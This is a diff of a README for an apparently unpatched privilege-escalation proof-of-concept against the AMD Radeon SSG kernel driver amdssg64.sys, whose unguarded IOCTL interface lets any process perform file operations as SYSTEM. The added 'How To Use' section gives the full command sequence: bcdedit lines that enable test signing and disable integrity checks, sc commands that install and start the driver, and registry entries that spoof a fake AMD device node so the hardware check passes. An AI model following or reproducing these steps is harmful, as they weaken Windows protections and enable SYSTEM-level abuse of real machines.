@@ -5,19 +5,56 @@ This is not a known exploit nor is it patched yet. amdssg64.sys (AMD Radeon SSG 
 
 The driver is a WDF (KMDF) PnP driver originally built for AMD's Radeon SSG (Solid State Graphics) PCIe cards featuring onboard flash storage. It was designed to let AMD's usermode software perform direct file I/O through the kernel for high-bandwidth data transfers to the SSG's local storage. However, the IOCTL interface has no access control — any process that can open the device handle can issue file operations as SYSTEM.
 
-The driver validates that AMD SSG hardware (`DEV_7300` or `DEV_6862`) is present via `IoGetDeviceInterfaces` before processing file operations. This requires a system with the matching hardware or an older version of Windows where the driver can be loaded and the device interface registered.
+The driver validates that AMD SSG hardware (`DEV_7300` or `DEV_6862`) is present via `IoGetDeviceInterfaces` before processing file operations. This requires a system with the matching hardware or a spoofed device node to satisfy the check.
 
 **Tested on Windows 10 22H2.** Newer versions of Windows may block loading the driver due to driver signing policy changes.
 
 # How To Use
-1. Download the repository and compile with CMake (MinGW or MSVC)
-2. Copy `amdssg64.sys` to `C:\Windows\System32\drivers\`
-3. Load the driver:
+
+### Step 1 — Enable Test Signing
 ```
+bcdedit /set testsigning on
+bcdedit /set nointegritychecks on
+bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS
+shutdown /r /t 0
+```
+
+### Step 2 — Install the Driver
+After reboot, copy `amdssg64.sys` and create the kernel service:
+```
+copy amdssg64.sys C:\Windows\System32\drivers\amdssg64.sys
 sc create SSG binpath="C:\Windows\System32\drivers\amdssg64.sys" type=kernel
+```
+
+### Step 3 — Spoof the AMD SSG Device Node
+The driver is a PnP driver — it will only create its device interface when Windows enumerates a matching hardware device. Without an actual AMD Radeon SSG card, you need to create a fake device node in the registry so PnP binds the driver:
+```
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v HardwareID /t REG_MULTI_SZ /d "PCI\VEN_1002&DEV_7300&REV_CC" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Service /t REG_SZ /d "SSG" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v ClassGUID /t REG_SZ /d "{4D36E97D-E325-11CE-BFC1-08002BE10318}" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Class /t REG_SZ /d "System" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Driver /t REG_SZ /d "{4D36E97D-E325-11CE-BFC1-08002BE10318}\9999" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v ConfigFlags /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v DeviceDesc /t REG_SZ /d "AMD Radeon SSG" /f
+```
+
+### Step 4 — Reboot and Start
+```
+shutdown /r /t 0
+```
+After reboot:
+```
 sc start SSG
 ```
-4. Run the compiled executable
+
+### Step 5 — Verify
+Confirm the device interface is registered:
+```
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceClasses\{EBD5EFC4-27AD-4CD0-AC13-6279ED7DB699}"
+```
+
+### Step 6 — Run
+Compile the project and run the executable. The output should show a valid device handle.
 
 # Driver Details
 
